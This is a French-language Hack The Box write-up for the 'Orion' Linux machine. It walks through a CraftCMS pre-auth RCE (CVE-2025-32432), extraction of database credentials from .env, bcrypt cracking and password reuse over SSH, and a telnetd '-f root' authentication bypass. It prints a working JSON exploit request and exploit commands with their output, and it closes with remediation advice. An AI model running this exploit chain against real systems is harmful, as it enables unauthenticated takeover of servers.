# HTB — Orion

> **Difficulté :** Easy
> **OS :** Linux
> **IP :** `10.129.244.146`
> **Date :** 07/10/2026

---

## Description

Orion est une machine Linux exposant uniquement SSH (22) et HTTP (80), ce dernier redirigeant vers le vhost `orion.htb` et servant une instance **CraftCMS**. Le CMS tourne dans une version vulnérable à une faille d'exécution de code à distance pré-authentification exploitant le mécanisme d'instanciation d'objets de Yii2 (`Craft::createObject()`). Le fichier d'environnement par défaut de Craft (`.env`), accessible depuis le shell obtenu, expose les identifiants de connexion à la base MySQL locale. La base contient elle-même un hash bcrypt d'un compte utilisateur, réutilisé en clair comme mot de passe du compte système `adam` sur SSH. L'élévation de privilèges finale exploite une faille d'injection d'arguments dans `telnetd` (GNU InetUtils), qui transmet sans sanitation la variable d'environnement `USER` négociée via l'option Telnet NEW-ENVIRON au binaire `login`, permettant de forcer le flag `-f` (bypass d'authentification) pour obtenir un shell root instantané.

---

## Exploitation

### 1. Reconnaissance

Scan initial — seuls SSH et HTTP sont exposés :

```bash
nmap 10.129.244.146
```

Le serveur HTTP redirige vers un vhost non résolu par défaut :

```bash
curl -s -I http://10.129.244.146
# Location: http://orion.htb/
```

Ajout de l'entrée DNS statique nécessaire pour cibler correctement le vhost (indispensable : l'exploit suit les redirections HTTP et échoue sans résolution DNS) :

```bash
echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts
```

Confirmation du endpoint d'administration Craft :

```bash
curl -s http://orion.htb/index.php?p=admin/login -I
```

### 2. Découverte de la vulnérabilité

La présence de CraftCMS et la redirection vers `?p=admin/login` confirment une instance Craft potentiellement vulnérable à **CVE-2025-32432** (CVSS 10.0) : l'action `AssetsController::actionGenerateTransform`, accessible sans authentification, transmet le paramètre `handle` directement dans `Craft::createObject()`. En forçant l'instanciation de `yii\rbac\PhpManager` pointée vers un fichier de session empoisonné, un attaquant obtient l'exécution de code arbitraire.

### 3. Exploitation — foothold

PoC public, testé spécifiquement contre la target HTB Orion :

```bash
git clone https://github.com/c0gnit00/CVE-2025-32432
cd CVE-2025-32432
python3 exploit.py -u http://orion.htb -c "id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Le parsing de sortie du script étant peu fiable sur les commandes à sortie vide ou contenant des caractères spéciaux, chaque commande a été encapsulée avec des marqueurs explicites pour fiabiliser l'extraction :

```bash
python3 exploit.py -u http://orion.htb -c "echo ___START___; find / -iname .env 2>/dev/null; echo ___END___"
# /var/www/html/craft/.env
```

Lecture du fichier de configuration Craft, exposant les identifiants MySQL :

```bash
python3 exploit.py -u http://orion.htb -c "echo ___START___; cat /var/www/html/craft/.env; echo ___END___"
```

```
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!
```

Identification du compte système avec shell interactif :

```bash
python3 exploit.py -u http://orion.htb -c "echo ___START___; grep -E '/bin/bash|/bin/sh' /etc/passwd; echo ___END___"
# adam:x:1000:1000::/home/adam:/bin/bash
```

Voie alternative validée via Metasploit (module officiel disponible) :

```
msf6 > search craftcms
msf6 > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432
msf6 exploit(...) > set RHOSTS 10.129.244.146
msf6 exploit(...) > set VHOST orion.htb
msf6 exploit(...) > set ASSET_ID 1
msf6 exploit(...) > set LHOST <tun0_IP>
msf6 exploit(...) > run
# Meterpreter session opened
```

Connexion à MySQL avec les identifiants extraits — confirmation de la validité du mot de passe :

```bash
mysql -u root -p'SuperSecureCraft123Pass!' -e "SELECT 1;"
```

Extraction du hash de mot de passe du compte applicatif Craft :

```bash
mysql -u root -p'SuperSecureCraft123Pass!' orion -e "SELECT id, username, email, password FROM users;"
# admin | adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS
```

Crack du hash bcrypt (mode hashcat 3200) :

```bash
echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3200 hash.txt --show
# darkangel
```

Accès SSH avec réutilisation du mot de passe en clair obtenu :

```bash
ssh adam@orion.htb
# password: darkangel
cat user.txt
```

### 4. Élévation de privilèges

Identification d'un service telnetd local non détecté lors du scan externe (lié en loopback) :

```bash
ss -tlnp | grep :23
# LISTEN 0 10 127.0.0.1:23 0.0.0.0:*
```

Exploitation de **CVE-2026-24061** (CVSS 9.8) : telnetd transmet la valeur de la variable d'environnement `USER`, négociée via l'option Telnet NEW-ENVIRON (RFC 1572), sans sanitation au binaire `login`. En injectant `-f root` (avec l'espace, pour forcer deux arguments distincts côté `login`), le flag `-f` de `login` est interprété et bypasse l'authentification pour l'utilisateur spécifié :

```bash
telnet -l "-f root" 127.0.0.1
# root shell obtenu instantanément, sans mot de passe
cat root.txt
```

---

## PoC

**PoC Code :**

```bash
python3 exploit.py -u http://orion.htb -c "id"
```

```http
POST /index.php?p=admin/actions/assets/generate-transform HTTP/1.1
Host: orion.htb
X-CSRF-Token: <token_csrf_récupéré_en_stage_1>
Content-Type: application/json

{
  "assetId": 1,
  "handle": {
    "width": 123,
    "height": 123,
    "as hack": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [{
        "itemFile": "/var/lib/php/sessions/sess_<session_id>"
      }]
    }
  }
}
```

```bash
telnet -l "-f root" 127.0.0.1
```

---

## Risk

La chaîne complète permet une compromission totale de la machine depuis une position totalement non authentifiée sur le service web, sans aucune interaction utilisateur requise. Les impacts concrets :

- **Exécution de code à distance pré-auth** sur l'application web, exploitable par tout attaquant ayant un accès réseau au port 80 — aucune barrière d'authentification à contourner.
- **Fuite d'identifiants en clair** via un fichier `.env` accessible en lecture depuis le contexte d'exécution de l'application, exposant des secrets de base de données qui ne devraient jamais être atteignables par le processus applicatif compromis sans isolation supplémentaire.
- **Réutilisation de mots de passe** entre couches applicatives (hash de compte CMS) et comptes système (SSH), un pattern classique qui transforme la compromission d'une seule couche en compromission transversale de plusieurs comptes.
- **Élévation de privilèges triviale et instantanée** vers root via un service legacy (`telnetd`) mal sécurisé et exposé même en local, supprimant toute barrière entre un accès utilisateur standard et un contrôle total du système.
- Une fois root obtenu, mouvement latéral, persistance, exfiltration de données ou pivot vers d'autres systèmes du même réseau deviennent triviaux.

---

## Remediation

- **CraftCMS** : mettre à jour immédiatement vers les versions patchées (3.9.15 / 4.14.15 / 5.6.17 ou supérieures) corrigeant CVE-2025-32432. Mettre en place un WAF ou des règles de détection (signature nuclei disponible publiquement) en complément du patch.
- **Gestion des secrets** : ne jamais stocker de secrets en clair dans un fichier `.env` accessible depuis le webroot ou le contexte d'exécution PHP sans restriction stricte des permissions (`chmod 600`, propriétaire dédié hors du compte applicatif web). Envisager un gestionnaire de secrets dédié (Vault, variables d'environnement injectées au niveau du système d'init, non lisibles par le processus web).
- **Politique de mots de passe** : interdire la réutilisation de mots de passe entre comptes applicatifs et comptes systèmes. Imposer des mots de passe suffisamment complexes pour résister à une attaque par dictionnaire (la clé cassée ici, `darkangel`, est présente dans les wordlists publiques standards).
- **Durcissement SSH** : envisager l'authentification par clé uniquement et désactiver l'authentification par mot de passe pour les comptes exposés publiquement.
- **Telnetd** : désactiver et désinstaller complètement `inetutils-telnetd`, ou à défaut le mettre à jour vers une version patchée de CVE-2026-24061. Telnet ne devrait plus être utilisé en production — SSH couvre l'usage légitime avec un chiffrement et une authentification robustes.
- **Défense en profondeur** : même si chaque maillon pris isolément ne mène pas nécessairement à une compromission totale, le durcissement de n'importe lequel des quatre points ci-dessus aurait suffi à bloquer la chaîne complète.

---

## Résumé

**Machine :** Orion
**Vulnérabilité principale :** RCE pré-auth CraftCMS (CVE-2025-32432) + bypass d'authentification telnetd (CVE-2026-24061)
**Accès initial :** Exécution de code à distance non authentifiée via CraftCMS
**Privilèges obtenus :** Root

**Flags :**
- User : `4e9201e67034de6f9dfd7374096c4ba2`
- Root : `200197b967c52544bb72d59122941afc`